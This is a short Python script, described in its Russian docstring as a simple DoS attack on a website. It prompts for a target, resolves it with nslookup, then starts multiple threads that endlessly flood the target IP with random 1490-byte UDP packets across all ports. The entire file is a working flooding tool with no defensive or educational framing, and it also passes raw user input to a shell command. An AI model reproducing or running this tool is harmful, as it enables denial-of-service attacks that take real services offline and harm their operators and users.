"""
простая dos атака на сайт
~100_000 пакетов за 20s
"""
import os
import time
import socket
import random
import threading
from colorama import Fore, init
init(autoreset=True)


def attack(host, port, color='\033[92m'):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    sent = 0
    while True:
        sock.sendto(bytes, (host, port))
        sent += 1
        port += 1
        print(color + "%s packet sent to %s:%s\033[0m" % (sent, host, port))
        if port == 65534:
            port = 1


if __name__ == '__main__':
    web = input(f"{Fore.CYAN}[*] {Fore.RESET}Target website >>>")
    print(os.system(f"nslookup {web}"))

    host = input(f"{Fore.CYAN}[*] {Fore.RESET}IP Target >>> ")
    port = int(input(f"{Fore.CYAN}[*] {Fore.RESET}PORT >>> "))
    thr_counts = int(input(f"{Fore.CYAN}[*] {Fore.RESET}Number of threads {Fore.LIGHTRED_EX}[max target = 8]  {Fore.RESET}>>> "))

    os.system("clear")
    print(f"{Fore.BLUE}Preparing for an attack")
    print(f"ip-: {host} -port-: {port} -counts of threads-: {thr_counts}")
    print(f"{Fore.CYAN} ======D     15%"); time.sleep(.2)
    print(f"{Fore.CYAN} =============D      25%"); time.sleep(.3)
    print(f"{Fore.CYAN} ====================D       50%"); time.sleep(.4)
    print(f"{Fore.CYAN} =============================D        75%"); time.sleep(.3)
    print(f"{Fore.CYAN} =====================================D     100%"); time.sleep(.2)
    os.system("clear")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print(f"{Fore.CYAN}Checking the server IP and port...\n"
              f"{Fore.RED}Error! Check the correct IP and Port..\n")
        raise e

    colors = list(Fore.__dict__.values())
    for i in range(thr_counts):
        color = colors[i % len(colors)]
        t = threading.Thread(target=attack, args=(host, port, color))
        t.start()
